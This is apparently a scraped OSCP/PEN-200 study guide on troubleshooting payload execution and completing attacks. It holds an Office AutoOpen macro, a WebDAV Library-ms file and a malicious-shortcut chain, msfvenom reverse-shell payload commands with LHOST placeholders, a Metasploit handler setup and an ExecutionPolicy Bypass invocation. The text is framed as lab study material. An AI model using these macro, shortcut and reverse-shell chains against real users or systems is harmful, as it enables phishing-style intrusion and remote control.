title: 1.1.12 Sources and shared concepts
text: id="sources-and-shared-concepts">1.1.12 Sources and shared concepts Supplied PEN-200 Ch 6 pp136–165. Nmap scan techniques , port selection , NSE . Commands and their adjacent variant conditions are synchronized extracts of the linked operational procedures. Those procedures own complete execution details; this guide owns method selection, explanations and worked reasoning. Tool availability on the learner's Kali or a target must be checked in that environment.

title: 7.1 Resolve payload execution obstacles
text: id="resolve-payload-execution-obstacles">7.1 Resolve payload execution obstacles Strategy map | Master Notes | Operational index | Cheatsheets Locate the first failed boundary: delivery → trigger → parser → format/runtime → execution policy/control → connection → session. Change the condition supported by evidence instead of replacing every payload component. Speedrun blocks: 14; used throughout 4, 6, 7 and 12–13. Documented methods: 9. Examples are hypothetical study material. Apply commands only to an assigned scope during the later practice phase. A method is enabled by its prerequisites; its presence here does not establish a vulnerability or practical mastery. <h2

title: 7.1.1 First pass: tools and findings
text: id="first-pass-tools-and-findings">7.1.1 First pass: tools and findings Use the branch matching the current host, identity and observed result. Tool output supplies leads; the linked procedure verifies and uses the exact condition. <h3

title: 7.1.1.1 Find the first failed runtime boundary
text: id="find-the-first-failed-runtime-boundary">7.1.1.1 Find the first failed runtime boundary Check bytes, file type, architecture and runtime before trying another payload. file FILE sha256sum FILE readelf -l FILE 2>/dev/null uname -m If Wrong architecture or executable format: Fix the artifact/build before re-running it. → Compile and minimally adapt an existing native or memory-corruption PoC . If The file reaches a different parser than expected: Inspect quoting, encoding and the exact invocation. → Repair quoting, encoding and command-length boundaries . Otherwise: The artifact runs but no session appears: inspect handler and packet direction. → Pair staged payloads with the correct handler and session lifecycle . <h3

title: 7.1.1.2 Match the payload handler and connection direction
text: id="match-the-payload-handler-and-connection-direction">7.1.1.2 Match the payload handler and connection direction Keep the exact payload/session type, listener address and actual initiator together. show options jobs sessions If Handler settings match but no packet arrives: Check the callback route from the target, including any pivot. → Diagnose connection direction, listener and session failures in order . If A session opens under the expected identity: Verify the host and make the command channel usable. → Verify command execution, host and represented identity . Otherwise: A connection immediately dies: inspect the actual process/session lifecycle rather than assuming a working shell. → Use a framework module with explicit target and feature constraints . <h2

title: 7.1.2 Discovery workflow
text: id="discovery-workflow">7.1.2 Discovery workflow Start with the saved delivery/trigger/parser/runtime/connection chain and the last state actually proved. Follow these observations into a method; the detailed recognition routes below show synthetic output and the checks still needed. For client-side paths establish the consumer and required interaction before callbacks: Use a gated Office macro delivery chain ; Use a Windows Library/WebDAV/shortcut chain with explicit interaction . Inspect bytes, format, architecture, parser and runtime at the first failed boundary: Match an artifact to its executable consumer and runtime ; Repair quoting, encoding and command-length boundaries . Differentiate PowerShell language/policy and endpoint-control evidence: Distinguish PowerShell policy, language mode and protected execution layers ; Interpret endpoint-control evidence and select a justified alternative . Match the exact handler and session lifecycle, then inspect actual packet direction: Pair staged payloads with the correct handler and session lifecycle ; Use a framework module with explicit target and feature constraints ; Diagnose connection direction, listener and session failures in order . Decision rule: an observed clue opens a candidate. Choose it only after the missing conditions are verified; a failed check rules out that context, while unavailable evidence stays inconclusive . <h2

title: 7.1.3 Method families
text: id="method-families">7.1.3 Method families Client-side delivery and interaction: Use a gated Office macro delivery chain , Use a Windows Library/WebDAV/shortcut chain with explicit interaction . Format, parser and control boundaries: Match an artifact to its executable consumer and runtime , Repair quoting, encoding and command-length boundaries , Distinguish PowerShell policy, language mode and protected execution layers , Interpret endpoint-control evidence and select a justified alternative . Handlers, framework state and callbacks: Pair staged payloads with the correct handler and session lifecycle , Use a framework module with explicit target and feature constraints , Diagnose connection direction, listener and session failures in order . <h2

title: 7.1.4 Choose a method
text: id="choose-a-method">7.1.4 Choose a method Method Recognition clue Required access Enabling conditions Resulting capability Use a gated Office macro delivery chain An assigned client-side scenario includes Office and a document-open interaction A recorded delivery/execution chain with the expected consumer and effect Compatible installed Office/macro support, a real required user interaction, executable document state and allowed macro/security policy A verified document-triggered command effect under the opening user's identity Use a Windows Library/WebDAV/shortcut chain with explicit interaction A client-side scenario permits a Library file and remote share presentation A recorded delivery/execution chain with the expected consumer and effect Compatible Windows consumer, reachable WebDAV resource, correctly handled shortcut and required user launch; policy permits the action A verified shortcut-triggered command under the interacting user's identity Match an artifact to its executable consumer and runtime A downloaded/generated artifact exists but does not run A recorded delivery/execution chain with the expected consumer and effect Matching OS/process architecture, interpreter/loader/runtime, intact bytes, execute/destination permissions and compatible format A correctly identified artifact/runtime boundary and a suitable execution choice Repair quoting, encoding and command-length boundaries A simple command works while a longer or nested payload fails A recorded delivery/execution chain with the expected consumer and effect Known outer request/template/database parser and inner shell; correct character encoding and transport length A command representation that survives every required parser Distinguish PowerShell policy, language mode and protected execution layers PowerShell reports scripts disabled, constrained syntax or an execution-control error A recorded delivery/execution chain with the expected consumer and effect Actual host policy/language context and a supported allowed execution route; required runtime features remain available An evidence-based diagnosis and compatible execution choice Interpret endpoint-control evidence and select a justified alternative An artifact disappears, a process is blocked, or execution is stopped with a policy/security event A recorded delivery/execution chain with the expected consumer and effect Observable evidence at the relevant boundary and a compatible alternative whose own prerequisites hold A supported failure classification and selected alternative delivery/execution path Pair staged payloads with the correct handler and session lifecycle A payload connects without a session, or a handler/session exits unexpectedly A recorded delivery/execution chain with the expected consumer and effect Exact payload/architecture/transport pairing, correct listener binding, reachable staging path and suitable job/session configuration A verified intended session rather than merely a connected socket Use a framework module with explicit target and feature constraints A reviewed module fits a verified exploit prerequisite set A recorded delivery/execution chain with the expected consumer and effect Correct module/target/options, accepted payload/delivery route and the applicable current exam feature/target restrictions An independently verified module effect and a tracked framework context Diagnose connection direction, listener and session failures in order Command execution or payload delivery exists but the expected usable channel does not A recorded delivery/execution chain with the expected consumer and effect A recorded first execution proof, correct advertised route, active compatible listener and observable connection evidence The first failed delivery/execution/transport/session boundary and a targeted next test <h2

title: 7.1.5 Use a gated Office macro delivery chain
text: id="use-a-gated-office-macro-delivery-chain">7.1.5 Use a gated Office macro delivery chain Blocks: 14; used throughout 4, 6, 7 and 12–13. Operational procedure | Quick sheet <h3

title: 7.1.5.1 Purpose and result
text: id="1-purpose-and-result">7.1.5.1 Purpose and result A verified document-triggered command effect under the opening user's identity. <h3

title: 7.1.5.2 Recognition clues
text: id="2-recognition-clues">7.1.5.2 Recognition clues An assigned client-side scenario includes Office and a document-open interaction. <h4

title: 7.1.5.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access">7.1.5.2.1 Find the clue from your starting access Where to investigate: From the assigned client-side scenario identify the actual Office consumer, required open/enable interaction and file-origin policy before investigating callbacks. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A recorded delivery/execution chain with the expected consumer and effect Requires: Compatible installed Office/macro support, a real required user interaction, executable document state and allowed macro/security policy Action class: May deliver files, execute payloads or create sessions. Stop/verify: Verify the actual macro-triggered effect and user context; document receipt is not execution. Failure/next check: Missing Office, absent interaction, blocked internet macros or incompatible content invalidates the chosen chain. Use a method supported by the assigned scenario. Get-Item .\FILE -Stream * Get-Content .\FILE -Stream Zone.Identifier -ErrorAction SilentlyContinue Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Zone.Identifier present ZoneId=3 Office interaction: document opens; macro execution not observed Recognize this detail: Internet-origin metadata and absent macro execution localize an earlier gate than network connectivity. Still missing before method selection: Check compatible Office, actual macro/user trigger and applicable policy; a delivered/opened document is not execution. Outcome after checking Example and next decision Enabled after validation The permitted interaction triggers the expected bounded command effect: choose the supported delivery chain. Ruled out in this context Office/policy blocks the required macro path: reject this chain under those conditions. Inconclusive A missing callback with no trigger evidence leaves execution unknown. If you do not yet have this clue: start with Diagnose connection direction, listener and session failures in order . <h3

title: 7.1.5.3 Prerequisites
text: id="3-prerequisites">7.1.5.3 Prerequisites Starting access: A recorded delivery/execution chain with the expected consumer and effect. Required conditions: Compatible installed Office/macro support, a real required user interaction, executable document state and allowed macro/security policy. <h3

title: 7.1.5.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites">7.1.5.4 Discover and verify prerequisites Get-Item .\FILE -Stream * Get-Content .\FILE -Stream Zone.Identifier -ErrorAction SilentlyContinue <h3

title: 7.1.5.5 Why it works
text: id="5-why-it-works">7.1.5.5 Why it works Delivery, document open, macro enablement and child-process execution are separate gates. Mark of the Web and current Office policy can block a chain before any callback occurs. <h3

title: 7.1.5.6 Execute and choose variants
text: id="6-execute-and-choose-variants">7.1.5.6 Execute and choose variants Use a macro-enabled format such as .docm or a legacy .doc ; .docx does not persist embedded VBA macros by itself. Store the macro in the document, not only the global template. A minimal harmless execution proof is: Sub AutoOpen() RunProof End Sub Sub Document_Open() RunProof End Sub Sub RunProof() CreateObject("WScript.Shell").Run _ "cmd.exe /c whoami > %TEMP%\oscp-marker.txt", 0, True End Sub AutoOpen and Document_Open cover distinct Word opening paths. Replace the proof command only after the document, trigger and execution context are confirmed. Modern Office commonly blocks VBA macros in files carrying Mark of the Web rather than offering a universal one-click enable path. Relevant gates include: file format actually supports the macro; macro is stored in the delivered document; MOTW/Zone Identifier and security zone; Protected View and Trust Center settings; signed publisher or Trusted Location decisions; organization GPO that the user cannot override; user opened the document and performed the required permitted action; Office launched the expected child process; the child command survived VBA, CMD and PowerShell quoting; delivery and callback network paths both work. Inspect a file's zone without changing it: Get-Item -LiteralPath 'C:\PATH\FILE.docm' -Stream * Get-Content -LiteralPath 'C:\PATH\FILE.docm' -Stream Zone.Identifier ZoneId=3 represents the Internet zone. Absence of the stream does not prove that macro policy permits execution, and removing MOTW does not override every policy. <h3

title: 7.1.5.7 Worked example — hypothetical
text: id="7-worked-example--hypothetical">7.1.5.7 Worked example — hypothetical Observation: the document is delivered but no shell appears. Test: inspect the open/macro-trigger and policy gates first. Illustrative output: macros are blocked before the command executes. Interpretation: the callback is not yet the failed boundary. <h3

title: 7.1.5.8 Verify the result
text: id="8-verify-the-result">7.1.5.8 Verify the result Verify the actual macro-triggered effect and user context; document receipt is not execution. <h3

text: id="9-failure-and-fallback">7.1.5.9 Failure and fallback Missing Office, absent interaction, blocked internet macros or incompatible content invalidates the chosen chain. Use a method supported by the assigned scenario. <h3

title: 7.1.6 Use a Windows Library/WebDAV/shortcut chain with explicit interaction
text: id="use-a-windows-librarywebdavshortcut-chain-with-explicit-interaction">7.1.6 Use a Windows Library/WebDAV/shortcut chain with explicit interaction Blocks: 14; used throughout 4, 6, 7 and 12–13. Operational procedure | Quick sheet <h3

title: 7.1.6.1 Purpose and result
text: id="1-purpose-and-result-1">7.1.6.1 Purpose and result A verified shortcut-triggered command under the interacting user's identity. <h3

title: 7.1.6.2 Recognition clues
text: id="2-recognition-clues-1">7.1.6.2 Recognition clues A client-side scenario permits a Library file and remote share presentation. <h4

title: 7.1.6.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-1">7.1.6.2.1 Find the clue from your starting access Where to investigate: Inspect the actual Library XML, remote resource and shortcut properties from the assigned delivery scenario; distinguish browsing from launching. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A recorded delivery/execution chain with the expected consumer and effect Requires: Compatible Windows consumer, reachable WebDAV resource, correctly handled shortcut and required user launch; policy permits the action Action class: May deliver files, execute payloads or create sessions. Stop/verify: Verify the launched command's identity/effect and distinguish WebDAV requests from execution. Failure/next check: Unavailable WebDAV client, blocked remote path, missing shortcut interaction or policy can stop the chain before a callback. Get-Content .\FILE.library-ms Test-NetConnection LHOST -Port PORT Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Library resource: http://LHOST:PORT/ Remote folder request: observed Shortcut launch: not observed Recognize this detail: The resource can be presented while the executable user interaction is still absent. title: 7.1.6.5 Why it works
text: id="5-why-it-works-1">7.1.6.5 Why it works The Library describes a resource; browsing it is different from launching a shortcut. WebDAV access, file presentation and process execution are separate conditions. <h3

title: 7.1.6.6 Execute and choose variants
text: id="6-execute-and-choose-variants-1">7.1.6.6 Execute and choose variants A .Library-ms file is an XML library description that can present a remote location in Explorer. The PEN-200 attack pattern is two-stage: delivered .Library-ms → user opens library → Explorer reaches WebDAV location → user opens .lnk → shortcut launches chosen command → optional download/callback If WsgiDAV is already installed, publish a dedicated authorized-lab directory: mkdir -p webdav wsgidav --host=0.0.0.0 --port=80 \ --root=./webdav --auth=anonymous Anonymous mode exposes the selected directory. Bind only to the required lab interface when possible, place no sensitive files there and stop the server after the exercise. Port 80 is the reliable baseline for a plain-HTTP Windows WebDAV location. Use another port only after confirming the target WebClient accepts that URL form and the route permits it. Original library template using placeholders: <?xml version="1.0" encoding="UTF-8"?> <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"> <name>@windows.storage.dll,-34582</name> <version>1</version> <isLibraryPinned>true</isLibraryPinned> <iconReference>imageres.dll,-1002</iconReference> <templateInfo> <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType> </templateInfo> <searchConnectorDescriptionList> <searchConnectorDescription> <isDefaultSaveLocation>true</isDefaultSaveLocation> <isSupported>false</isSupported> <simpleLocation> <url>http://LHOST/</url> </simpleLocation> </searchConnectorDescription> </searchConnectorDescriptionList> </libraryDescription> Save it with a .Library-ms extension. Windows may add a serialized location after opening it; retain a clean source copy and inspect the final artifact before delivery. Create a shortcut on a controlled Windows preparation host: $shortcutPath = 'C:\PATH\webdav\ACTION.lnk' $shell = New-Object -ComObject WScript.Shell $shortcut = $shell.CreateShortcut($shortcutPath) $shortcut.TargetPath = "$env:SystemRoot\System32\cmd.exe" $shortcut.Arguments = '/c whoami > %TEMP%\oscp-marker.txt' $shortcut.WorkingDirectory = $env:TEMP $shortcut.IconLocation = "$env:SystemRoot\System32\imageres.dll,11" $shortcut.Save() Only after the harmless marker works, substitute a command compatible with the target and the separately proven callback route. Diagnose this chain at three independent network points: Explorer → WebDAV shortcut command → optional payload/download server executed payload → listener/handler Failure cues: Observation Next boundary Library opens empty WebDAV bind, reachability, WebClient/policy, modified library serialization WebDAV receives nothing Artifact not opened, URL/port wrong, client route or WebDAV blocked Directory appears; shortcut never runs Required second user action absent or shortcut blocked Marker works; download absent Command quoting, DNS and payload-server route Download occurs; no execution Format, permissions, policy, quarantine or dependency Execution proven; no callback Listener, route, payload/handler compatibility <h3

text: id="5-why-it-works-2">7.1.7.5 Why it works A file may exist while its dynamic loader is missing. A 64-bit OS can host a 32-bit consumer, and a DLL is not interchangeable with an EXE or script. <h3

title: 7.1.7.6.1.1 Linux checks
text: id="41-linux-checks">7.1.7.6.1.1 Linux checks uname -a uname -m file PAYLOAD readelf -h PAYLOAD | sed -n '1,25p' ldd PAYLOAD ls -l PAYLOAD findmnt -T /PATH/TO/PAYLOAD head -n 1 SCRIPT Common interpretations: Exec format error : wrong format/architecture or invalid interpreter line; Permission denied : missing execute permission, inaccessible parent directory, noexec , policy or identity issue; No such file or directory when the file exists: missing dynamic loader or broken shebang interpreter; missing shared object: runtime library mismatch; ^M in a shebang: CRLF line endings changed the interpreter path; works interactively but not through cron/service: environment, working directory, shell, identity or route differs. <h5

title: 7.1.7.6.1.2 Windows checks
text: id="42-windows-checks">7.1.7.6.1.2 Windows checks Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version,BuildNumber,OSArchitecture [Environment]::Is64BitOperatingSystem [Environment]::Is64BitProcess $env:PROCESSOR_ARCHITECTURE Get-AuthenticodeSignature -FilePath 'C:\PATH\PAYLOAD.exe' Keep OS architecture and consumer-process architecture separate. A 64-bit OS can run a 32-bit process under WOW64; injected code and DLLs must match the process they enter. A normal executable is not necessarily a service executable, DLL, MSI or script: Consumer Required property / common failure Direct process creation Compatible PE/ELF/script and dependencies Windows service Service-compatible entry/control behavior; error 1053 may follow execution of a non-service program DLL loader/hijack Correct bitness, expected exports and dependency behavior msiexec Valid MSI package, not an EXE renamed .msi PowerShell Valid syntax, edition/runtime compatibility and applicable policy/control state Existing memory-corruption PoC Documented architecture, space, bad characters and exit behavior <h3

title: 7.1.8.5 Why it works
text: id="5-why-it-works-3">7.1.8.5 Why it works HTTP encoding, shell quoting, PowerShell UTF-16LE encoding and application string escaping solve different transformations. Encoding is not encryption or an endpoint-control bypass. <h3

title: 7.1.8.6 Execute and choose variants
text: id="6-execute-and-choose-variants-3">7.1.8.6 Execute and choose variants Write the real chain: document/shortcut or HTTP/SQL/template input → application parser → VBA/WScript/application runtime → cmd.exe /c, /bin/sh -c or PowerShell → final command/payload Start with a short marker at every layer. Check: quote ownership at each layer; expansion of %VAR% , $VAR and PowerShell variables; metacharacters such as & , | , < , > , ; , backticks and parentheses; URL/JSON/XML/Base64 decode count; command-line, VBA-string, request-field or exploit-buffer length; current directory and relative paths. PowerShell encoded-command preparation: $command = 'COMMAND' $bytes = [Text.Encoding]::Unicode.GetBytes($command) [Convert]::ToBase64String($bytes) powershell.exe -NoProfile -NonInteractive -EncodedCommand BASE64_UTF16LE -EncodedCommand uses UTF-16LE. It solves some transport/quoting problems; it is not encryption and does not establish antimalware evasion. Write the parser chain explicitly: HTTP/SQL/template parser → application language → command launcher (`system`, `cmd /c`, `/bin/sh -c`, PowerShell) → target shell/interpreter → payload command Test each layer with a small command. Encode only for the layer that consumes the characters: python3 -c 'import urllib.parse; print(urllib.parse.quote("COMMAND"))' Typical failures: & , | , > , < , $ , backticks, quotes or spaces consumed by an outer shell; URL decoding occurs zero, one or two times; JSON, XML, SQL or template quoting changes the command; PowerShell receives UTF-8 Base64 instead of required UTF-16LE; payload length exceeds a field, command line or exploit buffer; 32-bit payload is injected into a 64-bit context or the reverse. <h3

title: 7.1.9.6 Execute and choose variants
text: id="6-execute-and-choose-variants-4">7.1.9.6 Execute and choose variants Do not merge these different controls: Control What it changes Useful evidence Execution policy Conditions for loading/running scripts Get-ExecutionPolicy -List and exact error Language mode Available PowerShell language features $ExecutionContext.SessionState.LanguageMode AMSI Submits supported script/content to antimalware Explicit block/error plus Defender/PowerShell events AppLocker/WDAC Application/script allow policy Effective policy and application-control events Defender/other AV File, memory, behavior and network decisions Status, detection history, quarantine/events Permissions File/process/service/ token rights Access-denied result under named identity Read-only checks: Get-ExecutionPolicy -List $ExecutionContext.SessionState.LanguageMode Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled, BehaviorMonitorEnabled,IoavProtectionEnabled,AntivirusSignatureVersion Get-MpThreatDetection | Select-Object InitialDetectionTime,ThreatID,ActionSuccess,Resources Get-AppLockerPolicy -Effective -Xml Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' ` -MaxEvents 50 -ErrorAction SilentlyContinue | Select-Object TimeCreated,Id,LevelDisplayName,Message Get-WinEvent -LogName 'Microsoft-Windows-AppLocker/EXE and DLL' ` -MaxEvents 50 -ErrorAction SilentlyContinue | Select-Object TimeCreated,Id,Message Get-WinEvent -LogName 'Microsoft-Windows-AppLocker/MSI and Script' ` -MaxEvents 50 -ErrorAction SilentlyContinue | Select-Object TimeCreated,Id,Message Cmdlets, logs and fields vary by edition, installed modules, permissions and control product. Missing output is inconclusive. Execution policy is defense in depth, not a Windows security boundary. A process-scoped policy setting may change script-loading behavior when GPO does not override it: powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\PATH\SCRIPT.ps1 This does not disable AMSI, application control, antimalware, permissions or network controls. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A recorded delivery/execution chain with the expected consumer and effect Requires: Observable evidence at the relevant boundary and a compatible alternative whose own prerequisites hold Action class: May deliver files, execute payloads or create sessions. title: 7.1.10.5 Why it works
text: id="5-why-it-works-5">7.1.10.5 Why it works Disappearance, access denial and a missing callback are not interchangeable proof of antivirus detection. Hash, file persistence, process creation and available events narrow the failed boundary. <h3

title: 7.1.10.6 Execute and choose variants
text: id="6-execute-and-choose-variants-5">7.1.10.6 Execute and choose variants Observation Most useful next action Transferred hash differs Repair transfer/encoding before execution File arrives then vanishes Inspect quarantine/detection events and resource path File remains; process creation denied Inspect AppLocker/WDAC, permissions and parent process Script-loading policy error Inspect scope/precedence; use an authorized process-only invocation if applicable Explicit AMSI/content block Treat content/control as confirmed; encoding alone is not a supported conclusion Process starts then exits Capture exit/error, dependency and architecture evidence Process remains; no connection Test target egress, LHOST and listener TCP handshake then close Handler/payload mismatch, stage failure, crash or control interruption Modern protection can inspect files, scripts after decoding, process memory, behavior and network activity. Therefore: changing a filename does not imply a new payload; Base64 does not imply concealment from AMSI; an in-memory technique is not automatically invisible; an encoder is primarily useful for transport/bad-character constraints, not guaranteed AV bypass; a clean third-party scanner result does not prove execution on the target and may disclose a private sample. Prefer the least complex route already supported by evidence: a direct command, native interpreter, authenticated management service or simple command shell may meet the objective without a custom binary. Deep shellcode development, process-injection implementation and generalized AV-bypass recipes are outside this speedrun. Windows Defender status, when the current identity can query it: Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled Do not label every failure “AV.” Differentiate: file never arrived or hashes differ; file arrived and disappeared/quarantined; process creation was denied; script content was blocked; process started and exited/crashed; callback was blocked after execution; application-control or language-mode restrictions; ordinary format, architecture, permission or dependency errors. Prefer an already available native or authenticated route when it satisfies the objective. Encoding is transport representation, not proof of evasion. Custom shellcode development and deep AV-bypass work are outside this unit. For MOTW/Office/Library-file delivery, execution-policy precedence, AMSI/AppLocker/Defender evidence and restricted Metasploit module/session handling, continue with payload execution obstacles . <h3

title: 7.1.11.6 Execute and choose variants
text: id="6-execute-and-choose-variants-6">7.1.11.6 Execute and choose variants msfvenom -l payloads | grep -E 'linux|windows' | grep -E 'x64|x86' msfvenom --list formats msfvenom -p PAYLOAD_NAME --list-options Baseline stageless command shells: msfvenom -p linux/x64/shell_reverse_tcp \ LHOST=LHOST LPORT=LPORT \ -f elf -o shell.elf msfvenom -p windows/x64/shell_reverse_tcp \ LHOST=LHOST LPORT=LPORT \ -f exe -o shell.exe file shell.elf shell.exe sha256sum shell.elf shell.exe Existing reviewed PoC with documented byte restrictions: msfvenom -p PAYLOAD_NAME \ LHOST=LHOST LPORT=LPORT \ EXITFUNC=thread \ -f FORMAT -v VARIABLE \ -b 'BAD_CHARACTERS' -s MAX_SPACE Use EXITFUNC only when the exploit/consumer requires that termination behavior. Never invent bad characters or size limits. Staging distinction: windows/x64/shell_reverse_tcp single/stageless windows/x64/shell/reverse_tcp staged A staged payload first connects and asks its handler for the larger stage. A raw Netcat listener cannot supply that protocol. Matching handler: msfconsole -q use exploit/multi/handler set PAYLOAD PAYLOAD_NAME set LHOST LHOST set LPORT LPORT set ExitOnSession false show options run -j Manage the resulting job/session deliberately: jobs -l sessions -l sessions -i SESSION_ID background sessions -k SESSION_ID jobs -k JOB_ID ExitOnSession false keeps the handler available after a session opens. run -j backgrounds the handler. A session ID is local to that framework instance; record the target, identity, payload and listener rather than relying on the number alone. Handler failure cues: Output Interpretation Handler never binds Bad local address, occupied port or privilege issue Raw listener receives connection; framework does not Different port/interface or payload transport Handler receives connection but no session Exact payload/stager mismatch, stage blocked or crash Session opens then dies Parent exits, payload exit behavior, route/control or process crash Session opens as unexpected architecture/type Default payload or target was not explicitly selected <h3

Discovery action — reference example: Execution context, effects and stopping rule Host/access: A recorded delivery/execution chain with the expected consumer and effect Requires: A recorded first execution proof, correct advertised route, active compatible listener and observable connection evidence Action class: May deliver files, execute payloads or create sessions. Stop/verify: Use command proof, packet evidence and actual channel behavior to identify the first failed boundary. Failure/next check: A timeout alone is inconclusive. Return to the original trigger if execution is unproved; use handler/TTY repair only after the prior state is confirmed. ss -lnt ip route get TARGET sudo tcpdump -ni INTERFACE tcp port PORT Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Execution proof: confirmed Listener: bound on EXPECTED_PORT Packet observation: no target SYN Recognize this detail: The channel failed before an observed connection; investigate trigger/advertised route/egress before terminal repair. Still missing before method selection: Name the process initiating the connection and its actual destination address/port. Check the listener bind and each route/pivot leg; if delivery works but no callback arrives, repair the return path before changing payload bytes. Outcome after checking Example and next decision Enabled after validation The correct packet/session path works and identity is verified: use the resulting channel. Ruled out in this context The advertised address is unreachable and not forwarded: reject that callback topology. Inconclusive No packets without prior execution proof cannot distinguish a failed trigger from network failure. title: 7.1.13.6 Execute and choose variants
text: id="6-execute-and-choose-variants-8">7.1.13.6 Execute and choose variants Delivery: prove the request/file/argument reaches the intended consumer. Execution: prove id / whoami , hostname or a bounded side effect in the exact context. Parser: verify quoting, encoding, interpreter, working directory and length. Payload: confirm OS, architecture, format, staged/stageless type and dependencies. Listener: start it first and verify the bound address and port. Route: test target-to-listener reachability from the execution context. Security control: use concrete errors, quarantine, logs or process behavior. Session: repair TTY, buffering, encoding and job control after connection. Target-side route checks where available: nc -vz LHOST LPORT curl -v --connect-timeout 5 http://LHOST:LPORT/ Test-NetConnection LHOST -Port LPORT -InformationLevel Detailed Observe Kali while triggering: sudo tcpdump -ni any tcp port LPORT Interpretation: Observation Next decision No SYN reaches Kali Wrong execution, LHOST, route, egress or earlier parser layer SYN arrives; no listener response Wrong bind/interface/port or local firewall TCP handshake then immediate close Payload/handler mismatch, crash or security control Connection stays but no commands Staged/raw mismatch, buffering or I/O/session issue Reproduce a harmless direct command in the exact vulnerable or user context. Confirm file/request integrity, final path and consumer. Identify every parser, interpreter and loader. Match target OS, process architecture, artifact format and runtime dependencies. Verify permissions, working directory, execution policy and application-control evidence. Start the correct listener/handler and prove its bind. Prove the target-to-listener route separately. Inspect concrete antimalware, application-control and process-failure evidence. Repair session I/O only after a connection exists. If step 1 fails, this is not yet a payload problem. Return to the exploit, input parser or execution primitive. <h5

title: 7.1.13.6.1.6 F. Metasploit module reports completion, no session
text: id="f-metasploit-module-reports-completion-no-session">7.1.13.6.1.6 F. Metasploit module reports completion, no session Observed: module ran Test: exact target profile, payload, callback route, handler output and service state Interpretation: completion is not verified execution/session Action: preserve module output and diagnose the first missing state artifact/request → delivered to intended consumer → required user/trigger action → parser/interpreter/loader → process or bounded side effect → network connection → handler protocol → usable session Boundary Decisive evidence Does not prove Delivery Expected bytes, request, document or shortcut arrives intact It was opened or parsed Trigger Intended user/service/parser consumed it Child process started Execution Harmless marker, process or command output Callback route works Connection Expected peer reaches listener Payload and handler agree Session Commands return; host and identity verified Stability or privilege Do not replace the artifact, payload, listener and route simultaneously. Record the last confirmed boundary and test the next one. <h3

title: 8.1 Complete attacks and retain reproducible evidence
text: id="complete-attacks-and-retain-reproducible-evidence">8.1 Complete attacks and retain reproducible evidence Strategy map | Master Notes | Operational index | Cheatsheets Operate the attack as changing state. Keep coverage questions separate from vulnerability hypotheses, select tests that resolve an uncertainty, re-enumerate after transitions and preserve enough evidence to reproduce each step. Speedrun blocks: 15. Documented methods: 5. Examples are hypothetical study material. Apply commands only to an assigned scope during the later practice phase. A method is enabled by its prerequisites; its presence here does not establish a vulnerability or practical mastery. <h2

title: 8.1.1 First pass: tools and findings
text: id="first-pass-tools-and-findings">8.1.1 First pass: tools and findings Use the branch matching the current host, identity and observed result. Tool output supplies leads; the linked procedure verifies and uses the exact condition. <h3

title: 8.1.1.1 Capture the access transition while it is reproducible
text: id="capture-the-access-transition-while-it-is-reproducible">8.1.1.1 Capture the access transition while it is reproducible Keep commands/output, host and identity beside the transition that produced them. hostname id ip addr If A new identity, host or route: Re-enumerate from that exact new position. → Maintain state and select the next evidence-producing test . If The final objective is evidenced: Build the report from the reproducible chain. → Build and validate the report and submission artifacts . Otherwise: A transition lacks proof: repeat its specific verification before connecting it to another method. → Integrate a standalone or assumed-breach AD attack . <h3

title: 8.1.1.2 When stuck, return to the last working boundary
text: id="when-stuck-return-to-the-last-working-boundary">8.1.1.2 When stuck, return to the last working boundary Preserve the working session/route. Change one failed layer at a time. LAST WORKING STATE | FIRST FAILED BOUNDARY | EXACT ERROR | CHANGED CONDITION | DISCRIMINATING TEST If Authentication works but an action is denied: Inspect service/object authorization under that same identity. → Match route, destination service and effective authorization . If A new credential or route has not been used for enumeration: Update the host/identity/route state and revisit the accessible surface. → Maintain state and select the next evidence-producing test . Otherwise: Several guesses added no evidence: switch to a missing enumeration check, not a more exotic payload. → Validate uncertain results and rebuild the service queue . <h2

title: 8.1.2 Discovery workflow
text: id="discovery-workflow">8.1.2 Discovery workflow Start with assigned scope/objectives and saved observations; no complete path or report-ready evidence is assumed. Follow these observations into a method; the detailed recognition routes below show synthetic output and the checks still needed. Record hosts, identities, material, routes and unresolved questions: Maintain state and select the next evidence-producing test . Connect only methods whose receiving prerequisites have evidence: Integrate a standalone or assumed-breach AD attack . Return to the last working state when tests stop producing new evidence: Recover from dead ends without repeating disproven paths . Capture each transition and validate rendered report/archive artifacts: Capture state-transition, proof and exploit-adaptation evidence ; Build and validate the report and submission artifacts . Decision rule: an observed clue opens a candidate. Choose it only after the missing conditions are verified; a failed check rules out that context, while unavailable evidence stays inconclusive . <h2

title: 8.1.5.5 Why it works
text: id="5-why-it-works">8.1.5.5 Why it works A route, credential or privilege change modifies the attack state. Coverage tests discover available behavior; hypothesis tests discriminate a proposed weakness. Mixing them hides missing prerequisites. <h3

title: 8.1.5.6 Execute and choose variants
